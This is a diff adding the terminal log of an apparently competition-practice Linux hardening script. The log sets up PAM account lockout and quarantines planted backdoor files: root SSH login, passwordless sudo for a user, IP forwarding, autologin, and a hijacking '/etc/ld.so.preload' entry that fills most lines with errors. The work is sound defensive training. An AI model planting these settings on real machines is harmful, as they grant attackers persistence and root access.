@@ -1,0 +1,991 @@
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m Background: apt: [1;33mapt-get update running[0m 1s | baseline scan: [1;33mrunning[0m 1s
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m=== Step: README intake  (readme.sh --if-missing)   (not logged: the README paste contains passwords) ===[0m
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [*] README from environment: admins: cpuser alice | users: bob carol dave frank | you: cpuser | critical: ssh
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m Saved README answers -> /root/cp-state/readme.conf   (see: sudo bash readme.sh --show)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;33m[!][0m Installed but NOT critical in the README: vsftpd apache2 (fileandpackage.sh offers removal - check the README first)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m README intake done in 0s. Full output: /root/cp-state/logs/readme.log
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m======== CP19 start.sh ========[0m  1s since start | auto mode ON
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  Background: apt: [1;33mapt-get update running[0m 1s | baseline scan: [1;33mrunning[0m 1s
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+   1 [1;32m[x][0m README intake                   0s
+   2 [ ] Forensics + EARLY MANUAL list   
+   3 [ ] Baseline review                 (waits for the scan)
+   4 [ ] Users + sudo                    
+   5 [ ] System config                   
+   6 [ ] Packages + files                
+   7 [ ] Ports                           
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (0 open)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  Enter = 2 Forensics + EARLY MANUAL list | 1-11 = that step | t = TODO (0) | a = auto on/off | q = quit
+> 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m=== Forensics questions - answer them BEFORE removing users, files or packages ===[0m
+  [*] (no Forensics Question files found on any Desktop - check the README)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m=== Forensics + EARLY MANUAL list - from CP Linux Checklist.txt (copy commands from the tracker or below) ===[0m
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+[1;36m* Forensics, DELETE FILES AFTER[0m
+[1;36m* Implement an account lockout policy (faillock) - paste the whole block into a root-capable terminal (creates the 3 pam-configs files)[0m
+sudo tee /usr/share/pam-configs/faillock >/dev/null <<'EOF'
+Name: Lockout on failed logins
+Default: no
+Priority: 0
+Auth-Type: Primary
+Auth:
+    [default=die] pam_faillock.so authfail
+EOF
+sudo tee /usr/share/pam-configs/faillock_reset >/dev/null <<'EOF'
+Name: Reset lockout on success
+Default: no
+Priority: 0
+Auth-Type: Additional
+Auth:
+    sufficient pam_faillock.so authsucc
+EOF
+sudo tee /usr/share/pam-configs/faillock_notify >/dev/null <<'EOF'
+Name: Notify on account lockout
+Default: no
+Priority: 1024
+Auth-Type: Primary
+Auth:
+    requisite pam_faillock.so preauth
+EOF
+   * Enable all three at once (same as running sudo pam-auth-update twice and selecting what we just added; keeps your other PAM edits)
+sudo pam-auth-update --enable faillock faillock_reset faillock_notify
+   * Set deny = 5, fail_interval = 900, unlock_time = 600 in /etc/security/faillock.conf (edits the lines in place, adds missing ones)
+for kv in "deny = 5" "fail_interval = 900" "unlock_time = 600"; do k=${kv%% *}; sudo sed -i -E "s/^[#[:space:]]*$k[[:space:]]*=.*/$kv/" /etc/security/faillock.conf; grep -qE "^$k[[:space:]]*=" /etc/security/faillock.conf || echo "$kv" | sudo tee -a /etc/security/faillock.conf >/dev/null; done; grep -E '^(deny|fail_interval|unlock_time)' /etc/security/faillock.conf
+   * After running pam-auth-update, open /etc/pam.d/common-auth and ensure:
+      1. pam_faillock.so preauth is before pam_unix.so
+      2. pam_faillock.so authfail is after pam_unix.so
+      3. pam_faillock.so authsucc is after authfail
+grep -n 'pam_faillock\|pam_unix' /etc/pam.d/common-auth
+[1;36m* Disable null password auth - AFTER the faillock step (pam-auth-update writes the pam_unix line)[0m
+   * Edit /etc/pam.d/common-auth
+      * Remove the option nullok from the line with pam_unix.so try_first_pass (backup to /root/cp-backups/manual/, then edit in place):
+sudo mkdir -p /root/cp-backups/manual && sudo cp -a /etc/pam.d/common-auth /root/cp-backups/manual/ && sudo sed -i -E 's/[[:space:]]nullok(_secure)?([[:space:]]|$)/\2/' /etc/pam.d/common-auth && grep -n pam_unix /etc/pam.d/common-auth
+
+
+  ? Forensics answered and EARLY MANUAL items done? [Y/n]: 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m Ticked.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m======== CP19 start.sh ========[0m  6s since start | auto mode ON
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  Background: apt: [1;33mapt-get update running[0m 6s | baseline scan: [1;32mdone[0m 3s, FIX NOW 12, REVIEW 7 (list: /root/baseline/FINDINGS.txt)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [ ] Baseline review                 
+   4 [ ] Users + sudo                    
+   5 [ ] System config                   
+   6 [ ] Packages + files                
+   7 [ ] Ports                           
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   
+  10 [ ] LATE MANUAL list                
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  11 [ ] Final TODO list                 (1 open)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  Enter = 3 Baseline reviewERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ | 1-11 = that step | t = TODO (1) | a = auto on/off | q = quit
+> 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m=== Step: Baseline review  (services/baseline.sh --review)   log: /root/cp-state/logs/review.log ===[0m
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+Baseline triage: 12 FIX NOW, then 7 REVIEW (asked once). Type a key + Enter; Enter alone = the [default];
+x = exit. Every change is backed up, quarantine moves files to /root/cp-quarantine (undo in INDEX.txt), services are re-checked.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 1/19[0m  [1;31mFIX NOW[0m  [ssh]  file no package owns: 644 root:root /etc/ssh/sshd_config.d/60-evil.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      PermitRootLogin yes
+      -> quarantine (q) unless the README needs it
+  60-evil.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m ssh.service restarted and active
+  [1;32m[+][0m quarantined /etc/ssh/sshd_config.d/60-evil.conf -> /root/cp-quarantine/etc/ssh/sshd_config.d/60-evil.conf   (undo: mv /root/cp-quarantine/etc/ssh/sshd_config.d/60-evil.conf /etc/ssh/sshd_config.d/60-evil.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 2/19[0m  [1;31mFIX NOW[0m  [vsftpd]  vsftpd.service has a drop-in no package owns: /etc/systemd/system/vsftpd.service.d/cptest-noipv6.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Service]
+      ExecStart=
+      ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf -olisten=YES -olisten_ipv6=NO
+      -> quarantine (q) if planted (unit is restarted and checked)
+  cptest-noipv6.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > s
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 3/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/sysctl.d/99-zz-net.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      net.ipv4.ip_forward = 1
+      -> quarantine (q) unless the README needs it
+  99-zz-net.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/sysctl.d/99-zz-net.conf -> /root/cp-quarantine/etc/sysctl.d/99-zz-net.conf   (undo: mv /root/cp-quarantine/etc/sysctl.d/99-zz-net.conf /etc/sysctl.d/99-zz-net.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 4/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 440 root:root /etc/sudoers.d/90-cloud-init-users
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      bob ALL=(ALL) NOPASSWD: ALL
+      -> quarantine (q) unless the README needs it
+  90-cloud-init-users: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/sudoers.d/90-cloud-init-users -> /root/cp-quarantine/etc/sudoers.d/90-cloud-init-users   (undo: mv /root/cp-quarantine/etc/sudoers.d/90-cloud-init-users /etc/sudoers.d/90-cloud-init-users)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 5/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/lightdm/lightdm.conf.d/80-autologin.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Seat:*]
+      autologin-user = nancy
+      -> quarantine (q) unless the README needs it
+  80-autologin.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
